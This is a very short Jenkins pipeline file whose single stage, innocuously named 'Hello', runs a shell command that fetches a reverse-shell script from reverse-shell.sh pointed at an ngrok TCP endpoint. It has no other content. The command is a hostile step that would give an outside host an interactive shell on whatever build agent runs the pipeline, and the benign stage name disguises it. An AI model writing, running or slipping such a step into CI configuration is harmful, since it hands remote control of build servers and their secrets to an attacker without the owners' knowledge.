pipeline {
	agent any
	stages {
    	stage('Hello') {
        	steps {
            	sh '''
                	curl https://reverse-shell.sh/tcp://6.tcp.ngrok.io:13900 sh
            	'''
        	}
    	}
	}
}
